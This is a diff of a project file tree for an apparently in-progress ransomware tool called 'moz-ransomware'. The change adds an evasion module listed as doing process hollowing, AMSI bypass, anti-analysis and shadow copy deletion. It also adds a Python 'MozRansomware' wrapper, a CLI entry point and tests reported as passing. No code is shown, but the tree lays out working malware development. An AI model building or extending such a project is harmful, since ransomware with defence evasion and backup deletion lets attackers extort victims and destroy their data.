@@ -9,18 +9,26 @@ moz-ransomware/
 ├── core/
 │   ├── CMakeLists.txt          (C++ build config, OpenSSL-linked)
 │   ├── include/
-│   │   └── moz_crypto.h        (Public API: CryptoEngine, AESEngine, RSAEncryptor)
+│   │   ├── moz_crypto.h        (AES-256-GCM, RSA-2048, hybrid encryption API)
+│   │   └── moz_evasion.h       (Process hollowing, AMSI bypass, anti-analysis)
 │   ├── src/
-│   │   └── moz_crypto.cpp      (AES-256-GCM, RSA-2048, hybrid encryption, file ops)
+│   │   ├── moz_crypto.cpp      (AES-256-GCM, RSA-2048, hybrid encryption, PBKDF2)
+│   │   ├── moz_evasion.cpp     (Process hollowing, AMSI bypass, shadow copy deletion)
+│   │   └── moz_c_api.cpp       (C API bridge for Python ctypes interop)
 │   ├── tests/
-│   │   └── test_crypto.cpp     (C++ test suite - 7 tests)
+│   │   ├── test_crypto.cpp     (7 C++ crypto tests - all pass)
+│   │   └── test_evasion.cpp    (7 C++ evasion tests - all pass)
 │   └── build/
-│       └── libmoz_crypto.a     (Static library)
+│       ├── libmoz_core.so      (Shared library with C API exports)
+│       ├── moz_test            (Crypto test executable)
+│       └── moz_evasion_test    (Evasion test executable)
 ├── wrapper/
 │   ├── src/
-│   │   └── moz_wrapper.py      (Python wrapper with MozCrypto/MozRansomware classes)
+│   │   ├── __init__.py         (Package marker)
+│   │   ├── moz_wrapper.py      (Python bridge: MozCrypto, MozEvasion, MozRansomware)
+│   │   └── moz_main.py         (CLI entry point)
 │   ├── tests/
-│   │   └── integration_test.py (Python integration tests)
+│   │   └── test_integration.py (Full workflow integration tests - all pass)
 │   └── include/
 └── README.md
 
